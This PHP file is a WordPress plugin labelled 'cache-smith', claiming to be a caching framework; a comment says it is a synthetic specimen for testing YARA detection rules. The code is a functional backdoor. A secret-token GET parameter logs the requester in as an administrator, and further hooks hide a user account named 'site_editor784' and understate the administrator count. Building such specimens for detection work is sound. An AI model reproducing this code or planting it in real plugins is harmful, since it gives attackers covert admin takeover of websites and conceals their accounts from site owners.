<?php
/*
Plugin Name: cache-smith
Description: Advanced caching framework for WordPress.
Version: 1.3.1
*/
// Synthetic specimen — auth-cookie backdoor variant
// This is NOT real malware; it is a minimal structure that exercises YARA rule logic.
add_action('init', function() {
    $params = array_keys($_GET);
    foreach ($params as $p) {
        if (preg_match('/^[0-9a-f]{12}$/', $p)) {
            $token = $_GET[$p];
            $secret = get_option('_cs_sync_token');
            if (hash_equals($secret, $token)) {
                $admins = get_users(['role' => 'administrator', 'number' => 1]);
                wp_set_auth_cookie($admins[0]->ID, true);
                wp_redirect(admin_url());
                exit;
            }
        }
    }
});
add_action('pre_user_query', function($q) {
    global $wpdb;
    $q->query_where .= $wpdb->prepare(" AND {$wpdb->users}.user_login != %s", 'site_editor784');
});
add_filter('pre_count_users', function($result) {
    if (isset($result['avail_roles']['administrator'])) {
        $result['avail_roles']['administrator']--;
    }
    return $result;
});
